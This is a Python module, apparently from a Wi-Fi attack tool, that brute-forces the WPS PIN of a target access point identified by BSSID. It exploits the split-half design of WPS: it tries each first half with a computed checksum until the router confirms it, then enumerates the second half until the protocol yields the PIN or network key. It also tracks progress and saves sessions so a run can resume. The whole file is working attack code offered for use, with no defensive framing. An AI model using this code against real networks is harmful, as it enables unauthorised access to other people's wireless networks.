import collections
import statistics
import time

from datetime import datetime

import src.wps.generator
import src.wps.connection
import src.utils
import src.args

class BruteforceStatus:
    """Stores bruteforce details and status."""

    def __init__(self):
        self.START_TIME = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.MASK = ''
        self.LAST_ATTEMPT_TIME = time.time() # Last PIN attempt start time
        self.ATTEMPTS_TIMES = collections.deque(maxlen=15)

        self.COUNTER = 0
        self.STATISTICS_PERIOD = 5

    def displayStatus(self):
        """
        Displays the current status of the brute force process, including the 
        percentage of completion, start time, and average time per PIN attempt.
        """
        average_pin_time = statistics.mean(self.ATTEMPTS_TIMES)

        if len(self.MASK) == 4:
            percentage = int(self.MASK) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.MASK[4:]) / 11000)) * 100

        print('[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
            percentage, self.START_TIME, average_pin_time
        ))

    def registerAttempt(self, mask: str):
        """
        Registers an attempt with the given mask, updates the attempt counter,
        records the time taken since the last attempt, and displays status if
        the counter reaches the statistics period.
        """
        current_time = time.time()

        self.MASK = mask
        self.COUNTER += 1
        self.ATTEMPTS_TIMES.append(current_time - self.LAST_ATTEMPT_TIME)
        self.LAST_ATTEMPT_TIME = current_time

        if self.COUNTER == self.STATISTICS_PERIOD:
            self.COUNTER = 0
            self.displayStatus()

class Initialize:
    """Handles bruteforce"""

    def __init__(self, interface: str):
        self.BRUTEFORCE_STATUS = BruteforceStatus()
        self.CONNECTION_STATUS = src.wps.connection.ConnectionStatus()
        self.GENERATOR  = src.wps.generator.WPSpin()
        self.CONNECTION = src.wps.connection.Initialize(
            interface
        )

    def _firstHalfBruteforce(self, bssid: str, first_half: str, delay: float = None) -> str | bool:
        """Attempts to bruteforce the first half of a WPS PIN"""

        checksum = self.GENERATOR.checksum

        while int(first_half) < 10000:
            t = int(first_half + '000')
            pin = f'{first_half}000{checksum(t)}'

            self.CONNECTION.singleConnection(bssid, pin)

            if self.CONNECTION_STATUS.isFirstHalfValid():
                print('[+] First half found')
                return first_half

            if self.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
                print('[-] WPS transaction failed, re-trying last pin')
                return self._firstHalfBruteforce(bssid, first_half)

            first_half = str(int(first_half) + 1).zfill(4)
            self.BRUTEFORCE_STATUS.registerAttempt(first_half)

            if delay:
                time.sleep(delay)

        print('[-] First half not found')
        return False

    def _secondHalfBruteforce(self, bssid: str, first_half: str, second_half: str, delay: float = None) -> str | bool:
        """Attempts to bruteforce the second half of a WPS PIN"""

        checksum = self.GENERATOR.checksum

        while int(second_half) < 1000:
            t = int(first_half + second_half)
            pin = f'{first_half}{second_half}{checksum(t)}'

            self.CONNECTION.singleConnection(bssid, pin)

            if self.CONNECTION_STATUS.LAST_M_MESSAGE > 6:
                return pin

            if self.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
                print('[-] WPS transaction failed, re-trying last pin')
                return self._secondHalfBruteforce(bssid, first_half, second_half)

            second_half = str(int(second_half) + 1).zfill(3)
            self.BRUTEFORCE_STATUS.registerAttempt(first_half + second_half)

            if delay:
                time.sleep(delay)

        return False

    def smartBruteforce(self, bssid: str, start_pin: str = None, delay: float = None):
        """Attempts to bruteforce a WPS PIN."""

        sessions_dir = src.utils.SESSIONS_DIR
        args = src.args.parseArgs()

        filename = f'''{sessions_dir}{bssid.replace(':', '').upper()}.run'''

        if (not start_pin) or (len(start_pin) < 4):
            try:
                # Trying to restore previous session
                with open(filename, 'r', encoding='utf-8') as file:
                    if input(f'[?] Restore previous session for {bssid}? [n/Y]').lower() != 'n':
                        mask = file.readline().strip()
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]

        self.BRUTEFORCE_STATUS.MASK = mask

        try:
            if len(mask) == 4:
                first_half = self._firstHalfBruteforce(bssid, mask, delay)
                if first_half and (self.CONNECTION_STATUS.STATUS != 'GOT_PSK'):
                    self._secondHalfBruteforce(bssid, first_half, '001', delay)
            elif len(mask) == 7:
                first_half = mask[:4]
                second_half = mask[4:]
                self._secondHalfBruteforce(bssid, first_half, second_half, delay)
            raise KeyboardInterrupt
        except KeyboardInterrupt as e:
            print('\nAborting…')

            with open(filename, 'w', encoding='utf-8') as file:
                file.write(self.BRUTEFORCE_STATUS.MASK)
            print(f'[+] Session saved in {filename}')

            if args.loop:
                raise KeyboardInterrupt from e
